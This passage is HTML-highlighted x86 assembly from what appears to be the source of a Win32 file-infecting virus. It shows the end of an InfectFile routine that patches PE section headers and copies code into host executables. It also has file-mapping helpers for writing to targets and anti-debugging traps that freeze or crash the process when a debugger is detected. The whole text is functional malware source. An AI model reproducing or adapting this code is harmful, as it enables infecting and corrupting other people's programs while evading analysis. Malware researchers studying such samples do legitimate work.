    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;     ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                          </span><span class="sc1">;number of sections</span><span class="sc0">

</span><span class="sc5">copy_sections</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc9">Align</span><span class="sc0">                          </span><span class="sc1">;align position</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;from ...</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;address of section data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;size of section data</span><span class="sc0">

    </span><span class="sc1">;to ...</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad.RetAddr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">;save pointer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">               </span><span class="sc1">;next section</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">               </span><span class="sc1">;next section</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">copy_sections</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EVA'</span><span class="sc0">                          </span><span class="sc1">;success, toggle flag</span><span class="sc0">
</span><span class="sc5">end_InfectFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc9">Align</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">                           </span><span class="sc1">;our align</span><span class="sc0">
</span><span class="sc5">AlignIt</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;nulify idiv remaider</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">idiv</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;divide it !</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">;mod = 0 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_align</span><span class="sc0">                            </span><span class="sc1">;yeah, align complete</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;no, increment address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AlignIt</span><span class="sc0">                         </span><span class="sc1">;and jump back</span><span class="sc0">
</span><span class="sc5">end_align</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;edi = new aligned address</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">Align</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">MyOpen</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                             </span><span class="sc1">;edx = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;hTemlate</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;normal attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                      </span><span class="sc1">;creation options</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;SA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">            </span><span class="sc1">;share mode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">                       </span><span class="sc1">;desired access</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpFileName</span><span class="sc0">                      </span><span class="sc1">;lpFileName</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">                        </span><span class="sc1">;open it !</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;eax = -1 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_MyOpen3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hMyFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;save handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">cdq</span><span class="sc0">                             </span><span class="sc1">;edx = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;lpszMapName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;max. size low</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;max. size high</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">                      </span><span class="sc1">;fdwProtect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;SA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;hFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">                     </span><span class="sc1">;create mapping !</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_MyOpen2</span><span class="sc0">                       </span><span class="sc1">;eax = 0 ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hMyMapFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;save handle</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;eax = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;bytes to map</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;offset low</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;offset high</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">                      </span><span class="sc1">;dwDesiredAccess</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;hMapObj</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">                      </span><span class="sc1">;map it !</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lpMyFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;save handle</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">;ret. value in ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">MyClose</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpMyFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">                        </span><span class="sc1">;close mapped file</span><span class="sc0">
</span><span class="sc5">end_MyOpen2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMyMapFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                        </span><span class="sc1">;close mapping</span><span class="sc0">
</span><span class="sc5">end_MyOpen3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMyFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                        </span><span class="sc1">;close file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MyOpen</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc1">;same as previous</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_OpenFile3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">win32_find_data.WFD_nFileSizeLow</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4096</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_OpenFile2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
</span><span class="sc5">end_OpenFile2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hMapFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">end_OpenFile3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OpenFile</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">seh_fn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore regs</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc0">             </span><span class="sc1">;get windows version</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">          </span><span class="sc1">;is it WinNT ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NT_debug_trap</span><span class="sc0">            </span><span class="sc1">;yeah, freeze this app</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a04h</span><span class="sc0">               </span><span class="sc1">;or Win98</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_debug_trap</span><span class="sc0">            </span><span class="sc1">;Win95-</span><span class="sc0">

</span><span class="sc5">debug_trap</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;Win95/98</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebugger</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">909119cdh</span><span class="sc0">          </span><span class="sc1">;set some instructions</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;say bye to your balls :-)</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2dh</span><span class="sc0">                              </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">no_debug_trap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seh_rs</span><span class="sc0">              </span><span class="sc1">;jump back</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2dh</span><span class="sc0">                  </span><span class="sc1">;some prefix</span><span class="sc0">
</span><span class="sc5">NT_debug_trap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebugger</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">;this will freeze our app</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;if not, this will cause</span><span class="sc0">
                        </span><span class="sc1">;access violation exception</span><span class="sc0">
</span><span class="sc5">IsDebugger</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">           </span><span class="sc1">;get memory address of kernel32</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">no_debug_trap</span><span class="sc0">         </span><span class="sc1">;error, jump</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IsDebuggerPresent</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">         </span><span class="sc1">;get procedure address of our API</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">no_debug_trap</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;call IsDebuggerPresent</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">no_debug_trap</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
